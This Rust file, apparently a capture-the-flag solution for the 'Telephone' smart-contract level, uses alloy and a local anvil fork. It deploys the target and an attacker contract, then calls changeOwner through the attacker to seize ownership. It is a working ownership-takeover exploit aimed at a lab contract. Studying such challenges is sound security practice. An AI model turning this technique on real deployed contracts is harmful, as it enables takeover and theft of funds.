use alloy::providers::{Provider, ProviderBuilder};
use alloy::{rpc::types::TransactionRequest, sol};
use alloy_eips::{BlockId, BlockNumberOrTag};
use alloy_primitives::utils::parse_ether;
use eyre::Result;
use tokio::time::{interval, Duration};

sol!(
    #[allow(missing_docs)]
    #[sol(rpc)]
    Telephone,
    "../client/src/contracts/out/Telephone.sol/Telephone.json"
);

sol!(
    #[allow(missing_docs)]
    #[sol(rpc)]
    TelephoneHack,
    "out/TelephoneHack.sol/TelephoneHack.json"
);

pub async fn solution_telephone() -> Result<()> {
    let rpc_url = "http://localhost:8545";
    let provider =
        ProviderBuilder::new().on_anvil_with_wallet_and_config(|anvil| anvil.fork(rpc_url))?;
    let accounts = provider.get_accounts().await?;
    println!("accounts[1]: {}", accounts[1]);
    let target_contract = Telephone::deploy(&provider).await?;
    let contract = TelephoneHack::deploy(&provider).await?;

    let call_builder = contract.changeOwner(target_contract.address().clone());
    let calldata = call_builder.calldata().to_owned();
    let tx = TransactionRequest::default()
        .from(accounts[1])
        .to(contract.address().clone())
        .input(calldata.into());
    let pending_tx = provider.send_transaction(tx).await?;
    println!("Transaction hash: {}", pending_tx.tx_hash());

    let owner = target_contract.owner().call().await?;
    println!("owner: {owner}");
    Ok(())
}
